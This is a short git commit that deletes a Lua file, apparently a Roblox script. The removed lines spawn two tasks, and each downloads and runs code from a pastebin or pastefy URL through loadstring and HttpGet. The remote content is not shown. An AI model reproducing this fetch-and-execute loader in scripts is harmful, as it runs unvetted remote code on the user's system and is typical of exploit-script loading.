66459861c21920ee6e7f59c1b70c5bb69fc281ae
Solvexis_LDK <gojda7693@gmail.com>
2026-08-01 03:12:50 +0300

    Delete Idk.lua

--- Idk.lua
+++
@@ -1,7 +0,0 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/D83SxixS"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/3uvStd1e/raw"))()
-end)
